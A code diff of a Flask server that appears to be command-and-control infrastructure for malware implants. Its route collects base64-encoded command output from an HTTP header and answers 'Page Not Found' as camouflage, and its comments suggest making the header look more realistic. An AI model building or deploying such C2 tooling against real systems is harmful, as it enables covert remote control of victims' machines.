@@ -12,7 +12,6 @@ def ImplantManager(a):
 
 
 db=Database()
-hello_world = None
 app = Flask(__name__)
 app.config.from_object(__name__)
 app.config['SECRET_KEY'] = '7d441f27d441f27567d441f2b6176a'
@@ -65,31 +64,11 @@ def ImplantCommandResult():
     if "X-Result" in request.headers:
         # -- X-Result is a placeholder header and should be changed to a more realistic value
         DecodedResponse = base64.b64decode(request.headers["X-Result"]).decode('utf-16')
-        Imp.CommandResponse(DecodedResponse)
+        Imp.CommandResponse(DecodedResponse, app.config['listener_type'])
     return "Page Not Found"
-
-
-@app.route("/node/<id>", methods=['POST'])
-def getNode(id):
-    return
 
 
 @app.route("/aaa",methods=["GET"])
 def testing():
     print(0)
 
-
-
-def print_time(threadName, delay):
-    app.run(debug=True, host='0.0.0.0', port=5000, threaded=True)
-
-if __name__ == "__main__":
-
-    #I=Implant.ImplantSingleton
-    app.run(debug=True, host='0.0.0.0', port=5000, threaded=True)
-    print ("App running")
-    from time import sleep
-    while True:
-        sleep(1)
-        #a = raw_input("Enter PS command: ")
-        #I.AddCommand(a)
